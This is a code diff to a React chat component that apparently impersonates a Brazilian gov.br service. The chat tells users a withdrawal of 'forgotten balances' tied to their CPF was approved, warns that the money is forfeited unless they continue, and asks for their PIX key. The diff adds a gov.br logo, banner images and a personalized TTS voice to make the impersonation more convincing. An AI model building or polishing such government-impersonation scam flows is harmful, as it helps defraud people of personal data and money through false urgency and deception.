@@ -77,21 +77,21 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setLeadValue(formattedVal);
         
         setTyping(false);
-        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`);
+        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "https://i.imgur.com/K1n89H4.jpeg");
         
         // Show second message after 2 seconds
         setTimeout(() => {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`);
+            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "https://i.imgur.com/9v1hK7u.jpeg");
             
             // Show third message after 2 seconds
             setTimeout(() => {
               setTyping(true);
               setTimeout(() => {
                 setTyping(false);
-                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`);
+                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "https://i.imgur.com/3jWwE1g.jpeg");
                 setAwaitingPix(true);
               }, 1500);
             }, 2000);
@@ -106,8 +106,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     setupChat();
   }, []);
 
-  const addBotMessage = (text: string, options?: any[]) => {
-    setMessages(prev => [...prev, { sender: "bot", text, options }]);
+  const addBotMessage = (text: string, options?: any[], image?: string) => {
+    setMessages(prev => [...prev, { sender: "bot", text, options, image }]);
   };
 
   const addUserMessage = (text: string) => {
@@ -167,9 +167,10 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       try {
         // Fetch TTS audio
         const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
-           name: leadName,
+           name: name,
            attendantName: attendant.name,
-           voiceId: attendant.voiceId
+           voiceId: attendant.voiceId,
+           value: formattedVal
         });
         if (ttsRes.data.audioBase64) {
            const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
@@ -221,7 +222,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
               {msg.sender === 'bot' && (
                 <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                    {/* Logo gov.br simulada */}
-                   <span className="text-white font-bold text-xs">gov.br</span>
+                  <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                 </div>
               )}
 
@@ -231,6 +232,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                     ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                     : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                 }`}>
+                  {msg.image && (
+                     <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
+                  )}
                   {msg.text.split('\\n').map((line:string, idx:number) => (
                      <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
                   ))}
@@ -256,7 +260,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           {typing && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
-                 <span className="text-white font-bold text-xs">gov.br</span>
+                 <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                </div>
                <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                   <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
